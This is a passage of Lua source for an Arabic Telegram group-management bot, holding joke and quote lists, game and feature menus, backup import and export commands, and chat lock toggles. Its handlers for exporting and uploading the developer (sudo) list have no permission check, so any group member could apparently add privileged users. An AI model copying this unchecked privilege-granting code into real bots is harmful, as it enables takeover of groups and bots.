"ﻣﺮه واﺣﺪ ﻣﺴﻄﻮل ﻣﺎﺷﻰ ﻓﻰ اﻟﺸﺎرع ﻟﻘﻰ مذﻳﻌﻪ ﺑﺘﻘﻮﻟﻪ ﻟﻮ ﺳﻤﺤﺖ ﻓﻴﻦ اﻟﻘﻤﺮ؟    ﻗﺎﻟﻬﺎ اﻫﻮه..   ﻗﺎﻟﺘﻠﻮ ﻣﺒﺮوك ﻛﺴﺒﺖ ﻋﺸﺮﻳﻦ ﺟﻨﻴﻪ..   ﻗﺎﻟﻬﺎ ﻓﻰ واﺣﺪ ﺗﺎﻧﻰ ﻫﻨﺎك اﻫﻮه.😹😹",
"مره واحد شاط كرة فى المقص..   اتخرمت. 😹😹",
"مرة واحد رايح لواحد صاحبه.. فا البواب وقفه بيقول له انت طالع لمين.. قاله طالع أسمر شوية لبابايا.. قاله يا أستاذ طالع لمين في العماره 😹😹",
"‏◉ مرة واحد اتخانق هو ومراته بالليل ومابيكلموش بعض.. حط لها ورقة جنب السرير قال لها صحيني الصبح الساعة ستة ونص.. صحي الصبح بيبص ف الساعة لقى الساعة عشرة.. ولقى جنبه ورقة مكتوب فيها اصحى الساعة بقت ستة ونص. ", 
"‏◉ مره واحد بلديتنا كان بيدق مسمار فى الحائط فالمسمار وقع منه فقال له :تعالى ف مجاش, فقال له: تعالي ف مجاش. فراح بلديتنا رامي على المسمار شوية مسمامير وقال: هاتوه. ",
"‏ ‏◉ واحدة عملت حساب وهمي ودخلت تكلم جوزها منه.. ومبسوطة أوي وبتضحك.. سألوها بتضحكي على إيه؟ قالت لهم أول مرة يقول لي كلام حلو من ساعة ما اتجوزنا.",
"◉  مره اسكندراني دعك المصباح طلعله جني..   جاب بيه مستيكة.",
"‏ ◉ واحد بلدياتنا عمل 2 إيميل، واحد دوت كوم للشتاء وواحد نص كوم للصيف",
"‏ ◉ ﺻﻌﻴﺪي ﻟﻐﻲ ﻣﻮﻋﺪه ﻣﻊ اﻟﺪﻛﺘﻮر!   عشان كان ﻣﺮﻳﺾ.",
"‏◉ بيقولك مره واحد نام ساعه..    صحي لقى نفسه حظاظه..",
"‏ ◉ مره واحد اشترى فراخ..   علشان يربيها فى قفص صدره. .",
"‏ ◉ واحدة عملت حساب وهمي ودخلت تكلم جوزها منه.. ومبسوطة أوي وبتضحك.. سألوها بتضحكي على إيه؟ قالت لهم أول مرة يقول لي كلام حلو من ساعة ما اتجوزنا..",
"‏ ‏: ◉ مرة مهندس برمجة اتجوز وخلف بنتين توأم .. سمى واحدة لوجين والتانية Log out.",
"◉ واحد بلدياتنا عمل 2 إيميل، واحد دوت كوم للشتاء وواحد نص كوم للصيف",
"‏ ◉ مرة واحد اتخانق هو ومراته بالليل ومابيكلموش بعض.. حط لها ورقة جنب السرير قال لها صحيني الصبح الساعة ستة ونص.. صحي الصبح بيبص ف الساعة لقى الساعة عشرة.. ولقى جنبه ورقة مكتوب فيها اصحى الساعة بقت ستة ونص.",
"‏ ‏◉ واحد أخوه مات ومش عاوز يصدم مراته بالخبر مرة واحدة.. دخل عليها وقال لها: جوزك اتجوز عليكي.. صوتت وقالت إلهي أشوفه داخل ميت.. قال لأصحابه: دخلوه يا رجالة.",
} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == 'قناة السورس' then
local Text = [[ 
[اضغط هنا وانضم الي قناه السورس](t.me/so_alfaa )
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ◉', url="t.me/so_alfaa "}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'الالعاب' then
local Text = [[ 
 ─────── ◉ ───────
◉ لستخدام الالعاب اتبع مايلي ..↑↓
 ─────── ◉ ───────
◉ منوعات اولاين ← لبدء العبه
◉ مسبقات اولاين ← لبدء العبه
◉ اكشن اولاين ← لبدء العبه
◉ لعبه الذكاء ← لبدء العبه
◉ لو خيروك ← لبدء العبه
◉ مستقبلي  ← لبدء العبه
◉ المليون ← لبدء اللعبه
◉ نمله  ← لبدء اللعبه
◉ اسئله ← لبدء العبه
◉ مهنتي  ← لبدء العبه
◉ تحليل ← لبدء العبه
◉ تحليل ← لبدء العبه
◉ كشف الكدب ← لبدء العبه
◉ العاب مطوره ← لبدء العبه
 ─────── ◉ ───────
◉ اليك ايضا قائمه العاب السورس
 ─────── ◉ ───────
◉ لعبة السمايلات ← سمايلات
◉ لعبة المختلف ← المختلف
◉ لعبة الصراحه ← صراحه
◉ لعبة بوستات ← بوستات
◉ لعبة كت تويت ← تويت
◉ لعبة منشورات ← كتبات
◉ لعبة العكس ← العكس 
◉ لعبة الحزوره ← حزوره
◉ لعبة انصح ← انصحني
◉ لعبه الاسرع ← الاسرع
◉ لعبة المعاني ← معاني
◉ لعبة التخمين ← خمن
◉ لعبة الامثله ← امثله
◉ لعبه النكت← نكته
◉ لعبة البـات ← بات
◉ لعبة الانجليزي ← انجليزي
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀](t.me/so_alfaa ) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ◉', url="t.me/so_alfaa "}}, 
{{text = 'اضف البوت لمجموعتك 𖠕', url="http://t.me/"..sudos.UserName.."?startgroup=new"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MADI_PICK/19?single&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "بوستات" or text == "قولي" then 
local TWEET_Msg = { 
" أحياناً.. ويصبح الوهم حقيقه😪.",
" الجمال يلفت الأنظار لكن الطيبه تلفت القلوب🙂 .!",
"لا تحقرون صغيره إن الجبال من الحصي 💖",
"لا تمد عينك في يد غيرك 💕",
"‏ بعض الاِعتذارات يجب أن تُرفَضّ. 🌚.",
"‏ هل كانت كل الطرق تؤدي إليكِ، أم أنني كنتُ أجعلها كذلك. 🤫 .!",
"ويُرهقني أنّي مليء بما لا أستطيع قوله.✨ ",
"‏أَكَان عَلَيَّ أَنْ أغْرَس انيابي فِي قَلْبِك لتشعر بِي ؟. 😁",
"‏ إن الأمر ينتهي بِنا إلى أعتياد أي شيء. 😎",
"‏ بعض الاِعتذارات يجب أن تُرفَضّ. 😃",
"لا تظلم حتى لا تتظلم 😊",
"لا حياه للإنسان بلا نبات ☺️",
"لا تقف قصاد الريح ولا تمشي معها.... ❤️",
" لا تملح الا لمن يستحقاها ويحافظ عليها😛",
"لا يدخل الجنه من لايأمن من جازه بوائقه 😿.",
"لا دين لمن لا عهد له 💞 ",
"لا تظلم حتى لا تتظلم 🌚.",
"عامل الناس بأخلاقك ولا بأخلاقهم 💞⛷️",
"لا تقف قصاد الريح ولا تمشي معها.... 💚 ",
"‏ ‏أحببتك وأنا منطفئ، فما بالك وأنا في كامل توهجي ؟ 🙂 .!",
"‏من ترك أمرهُ لله، أعطاه الله فوق ما يتمنَّاه💙 ",
"‏ إنعدام الرّغبة أمام الشّيء الّذي أدمنته ، انتصار. ←💛",
"‏ ‏كل العالم يهون بس الدنيا بينا تصفي 💙 ",
"‏ إن الأمر ينتهي بِنا إلى أعتياد أي شيء. 😚 ",
"‏ إنعدام الرّغبة أمام الشّيء الّذي أدمنته ، انتصار. 💝",
"‏ لا تعودني على دفء شمسك، إذا كان في نيتك الغروب .َ 🙂 .!",
"‏من علامات جمال المرأة .. بختها المايل ! ❤️",
"‏ علينا إحياء زَمن الرّسائل الورقيّة وسط هذه الفوضى الالكترونية العَارمة.💜 ",
"‏ كلما أتبع قلبي يدلني إليك . 😜",
"‏ انك الجميع و كل من احتل قلبي🫀🤍 ",
"‏ بس لما أنا ببقى فايق، ببقى أبكم له ودان.💖 ",
"‏ ‏ممكن اكون اختارت غلط بس والله حبيت بجد🖇️ ",
"‏ لا تعودني على دفء شمسك، إذا كان في نيتك الغروب .َ 💕",
" ‏ ‏تبدأ حياتك محاولاً فهم كل شيء، وتنهيها محاولاً النجاة من كل ما فهمت.💖",
"الجمال يلفت الأنظار لكن الطيبه تلفت القلوب 😁",
"كما تدين تدان 😊",
"عامل الناس بأخلاقك ولا بأخلاقهم 🙂",
"يسروا ولا تعسروا... ويشورا ولا تنفروا 💕",
" لا يدخل الجنه من لايأمن من جازه بوائقه💓",
" كل كتير عادي ميهمكش😂❤️",
"لا تملح الا لمن يستحقاها ويحافظ عليها 💞 ",
" الجمال يلفت الأنظار لكن الطيبه تلفت القلوب💞 ",
" خليك طبيعي مش نورم😇❤️ ",
" الدنيا حلوه متزعلش علي ناس ماتستاهلش🌝🏃‍♂️",
" العقل السليم ف البعد عن الحريم😇❤️",
"عيش الحياه يوم واحد 🙂 .! ",
"امشي كتير عشان تخس 🧐 .! ",
" اشرب ميه كتير 😎.",
"كُنْ لحوحاً فِي الدّعاءِ،فقدْ أوشكَ السّهمُ أنْ يُصيبَ. 💗",

} 
send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
return false 
end
if text == 'مميزات' then
local Text = [[ 
 ─────── ◉ ───────
◉ لستخدام المميزات اتبع مايلي ..↑↓
 ─────── ◉ ───────
◉ قران ← لعرض الميزه
◉ اذكار ← لعرض الميزه
◉ الصلاوات ← لعرض الميزه
◉ متحركه ← لعرض الميزه
◉ غنيلي ← لعرض الميزه
◉ استوري ← لعرض الميزه
◉ تصميم ← لعرض الميزه
◉ حساب العمر ← لعرض الميزه
◉ حساب الوزن ← لعرض الميزه
◉ نسبه الحب ← لعرض الميزه
◉ نسبه الغباء ← لعرض الميزه
◉ جمالي ← لعرض الميزه
◉ افلام ← لعرض الميزه
◉ اغاني ← لعرض الميزه
◉ روايات ← لعرض الميزه
◉ ثمات ← لعرض الميزه
◉ همسه ← لعرض الميزه
◉ معني + اسمك ← لعرض الميزه
◉ خلفيات ← لعرض الميزه
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◉ 𝘾𝙃 - [𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐀𝐋𝐅𝐀](t.me/so_alfaa ) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ◉', url="t.me/so_alfaa "}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/mmsst13/869&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == 'العاب الفا' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ◉ حسنا قم باختيار اللعبه 
 ◉ وبعدها الشات الذي تريد ان تلعب فيه
]]  
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = 'فلابي بيرد', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'تحداني فالرياضيات',url="https://t.me/gamebot?game=MathBattle"}},   
{{text = 'لعبه دراجات', url="https://t.me/gamee?game=MotoFX"},{text = 'سباق سيارات', url="https://t.me/gamee?game=F1Racer"}}, 
{{text = 'تشابه', url="https://t.me/gamee?game=DiamondRows"},{text = 'كره القدم', url="https://t.me/gamee?game=FootballStar"}}, 
{{text = 'ورق', url="https://t.me/gamee?game=Hexonix"},{text = 'لعبه 2048', url="https://t.me/awesomebot?game=g2048"}}, 
{{text = 'SQUARES', url="https://t.me/gamee?game=Squares"},{text = 'ATOMIC', url="https://t.me/gamee?game=AtomicDrop1"}}, 
{{text = 'CORSAIRS', url="https://t.me/gamebot?game=Corsairs"},{text = 'LumberJack', url="https://t.me/gamebot?game=LumberJack"}}, 
{{text = 'LittlePlane', url="https://t.me/gamee?game=LittlePlane"},{text = 'RollerDisco', url="https://t.me/gamee?game=RollerDisco"}},  
{{text = 'كره القدم 2', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'جمع المياه', url="https://t.me/gamee?game=BlockBuster"}},  
{{text = 'لا تجعلها تسقط', url="https://t.me/gamee?game=Touchdown"},{text = 'GravityNinja', url="https://t.me/gamee?game=GravityNinjaEmeraldCity"}},  
{{text = 'Astrocat', url="https://t.me/gamee?game=Astrocat"},{text = 'Skipper', url="https://t.me/gamee?game=Skipper"}},  
{{text = 'WorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'GeometryRun', url="https://t.me/gamee?game=GeometryRun"}},  
{{text = 'Ten2One', url="https://t.me/gamee?game=Ten2One"},{text = 'NeonBlast2', url="https://t.me/gamee?game=NeonBlast2"}},  
{{text = 'Paintio', url="https://t.me/gamee?game=Paintio"},{text = 'onetwothree', url="https://t.me/gamee?game=onetwothree"}},  
{{text = 'BrickStacker', url="https://t.me/gamee?game=BrickStacker"},{text = 'StairMaster3D', url="https://t.me/gamee?game=StairMaster3D"}},  
{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'BasketBoyRush', url="https://t.me/gamee?game=BasketBoyRush"}},  
{{text = 'GravityNinja21', url="https://t.me/gamee?game=GravityNinja21"},{text = 'MarsRover', url="https://t.me/gamee?game=MarsRover"}},  
{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"}},  
{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'KeepItUp', url="https://t.me/gamee?game=KeepItUp"}},  
{{text = 'SunshineSolitaire', url="https://t.me/gamee?game=SunshineSolitaire"},{text = 'Qubo', url="https://t.me/gamee?game=Qubo"}},  
{{text = 'PenaltyShooter2', url="https://t.me/gamee?game=PenaltyShooter2"},{text = 'Getaway', url="https://t.me/gamee?game=Getaway"}},  
{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'SpikyFish2', url="https://t.me/gamee?game=SpikyFish2"}},  
{{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"},{text = 'KungFuInc', url="https://t.me/gamee?game=KungFuInc"}},  
{{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
{{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
{{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
{{text = '𝚂𝙾𝚄𝚁𝙲𝙴 𝙲𝙷𝙰𝙽𝙽𝙴𝙻 ◉', url="t.me/so_alfaa "}},
}  
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/MADI_PICK/19?single&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
if text == 'رفع نسخه الاحتياطيه' and DevSoFi(msg) then   
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if tonumber(msg.reply_to_message_id_) > 0 then
function by_reply(extra, result, success)   
if result.content_.document_ then 
local ID_FILE = result.content_.document_.document_.persistent_id_ 
local File_Name = result.content_.document_.file_name_
AddFile_Bot(msg,msg.chat_id_,ID_FILE,File_Name)
end   
end
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text == 'جلب نسخه الاحتياطيه' and DevSoFi(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local so_alfaa  = database:get(bot_id..'text:ch:user')
if so_alfaa  then
send(msg.chat_id_, msg.id_,'['..so_alfaa ..']')
else
send(msg.chat_id_, msg.id_,'    \n  ◉ اشترك اولا بلقناه \n  ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
GetFile_Bot(msg)
end

if text == 'رفع المشتركين' and DevSoFi(msg) then 
function by_reply(extra, result, success)    
if result.content_.document_ then  
local ID_FILE = result.content_.document_.document_.persistent_id_  
local File_Name = result.content_.document_.file_name_ 
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) )  
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name)  
local info_file = io.open('./users.json', "r"):read('*a') 
local users = JSON.decode(info_file) 
for k,v in pairs(users.users) do 
database:sadd(bot_id..'User_Bot',v)  
end 
send(msg.chat_id_,msg.id_,'تم رفع المشتركين ') 
end    
end 
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil) 
end
if text == 'جلب المشتركين' and DevSoFi(msg) then 
local list = database:smembers(bot_id..'User_Bot') 
local t = '{"users":['   
for k,v in pairs(list) do 
if k == 1 then 
t =  t..'"'..v..'"' 
else 
t =  t..',"'..v..'"' 
end 
end 
t = t..']}' 
local File = io.open('./users.json', "w") 
File:write(t) 
File:close() 
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './users.json', ' عدد المشتركين { '..#list..'}') 
end

if text == 'جلب المطورين' then 
local list = database:smembers(bot_id..'Sudo:User') 
local t = '{"users":['   
for k,v in pairs(list) do 
if k == 1 then 
t =  t..'"'..v..'"' 
else 
t =  t..',"'..v..'"' 
end 
end 
t = t..']}' 
local File = io.open('./sudos3.json', "w") 
File:write(t) 
File:close() 
sendDocument(msg.chat_id_, msg.id_,0, 1, nil, './sudos3.json', ' عدد المطورين { '..#list..'}') 
end 
if text == 'رفع المطورين' then 
function by_reply(extra, result, success)    
if result.content_.document_ then  
local ID_FILE = result.content_.document_.document_.persistent_id_  
local File_Name = result.content_.document_.file_name_ 
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) )  
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name)  
local info_file = io.open('./sudos3.json', "r"):read('*a') 
local users = JSON.decode(info_file) 
for k,v in pairs(users.users) do 
database:sadd(bot_id..'Sudo:User',v)  
end 
send(msg.chat_id_,msg.id_,'تم رفع المطورين ') 
end    
end 
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil) 
end
--------------------------------------------------------------------------------------------------------------
if text == 'قفل الدردشه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:text"..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الدردشه ')
end,nil)   
elseif text == 'قفل الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:AddMempar"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n◉| تـم قفـل اضافة ')
end,nil)   
elseif text == 'قفل الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Join"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل دخول ')
end,nil)   
elseif text == 'قفل البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل البوتات ')
end,nil)   
elseif text == 'قفل البوتات بالطرد' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id.."lock:Bot:kick"..msg.chat_id_,'kick')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل البوتات بالطرد ')
end,nil)   
elseif text == 'قفل الاشعارات' and msg.reply_to_message_id_ == 0 and Mod(msg) then  
database:set(bot_id..'lock:tagservr'..msg.chat_id_,true)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الاشعارات ')
end,nil)   
elseif text == 'قفل التثبيت' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id.."lockpin"..msg.chat_id_, true) 
database:sadd(bot_id..'lock:pin',msg.chat_id_) 
tdcli_function ({ ID = "GetChannelFull",  channel_id_ = getChatId(msg.chat_id_).ID }, function(arg,data)  database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,data.pinned_message_id_)  end,nil)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل التثبيت ')
end,nil)   
elseif text == 'قفل التعديل' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock:edit'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل تعديل ')
end,nil)   
elseif text == 'قفل السب' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fshar'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل السب ')
end,nil)  
elseif text == 'قفل الفارسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Fars'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الفارسيه ')
end,nil)   
elseif text == 'قفل الانجليزيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id..'lock:Engilsh'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الانجليزيه ')
end,nil)
elseif text == 'قفل الانلاين' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:set(bot_id.."lock:inline"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الانلاين ')
end,nil)
elseif text == 'قفل تعديل الميديا' and msg.reply_to_message_id_ == 0 and Constructor(msg) then 
database:set(bot_id..'lock_edit_med'..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل تعديل ')
end,nil)    
elseif text == 'قفل الكل' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:set(bot_id..'lock:tagservrbot'..msg.chat_id_,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lsock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..msg.chat_id_,'del')    
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل جميع الاوامر ')
end,nil)   
end
if text == 'قفل الاباحي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:set(bot_id.."lock:Lock:Sexy"..msg.chat_id_,'del')  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم قفـل الاباحي ')
end,nil)   
elseif text == 'فتح الاباحي' and Mod(msg) and msg.reply_to_message_id_ == 0 then 
database:del(bot_id.."lock:Lock:Sexy"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الاباحي ')
end,nil)   
end
if text == 'فتح الانلاين' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:inline"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الانلاين ')
end,nil)
elseif text == 'فتح الاضافه' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:AddMempar"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح اضافة ')
end,nil)   
elseif text == 'فتح الدردشه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
database:del(bot_id.."lock:text"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح الدردشه ')
end,nil)   
elseif text == 'فتح الدخول' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Join"..msg.chat_id_)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ◉ بواسطه ← ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'so_alfaa ')..') \n ◉ تـم فتح دخول ')
end,nil)   
elseif text == 'فتح البوتات' and msg.reply_to_message_id_ == 0 and Mod(msg) then 
database:del(bot_id.."lock:Bot:kick"..msg.chat_id_)  
